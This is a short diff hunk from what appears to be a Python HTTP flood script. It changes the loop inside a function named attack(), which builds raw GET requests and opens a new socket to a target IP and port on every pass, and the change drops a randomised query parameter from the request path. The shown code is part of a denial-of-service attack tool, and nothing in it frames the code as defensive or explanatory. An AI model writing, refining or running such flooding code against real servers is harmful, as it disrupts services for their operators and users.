@@ -69,7 +69,7 @@ def attack():
     header = rqheader()
     go.wait()
     while True:
-        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+        get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
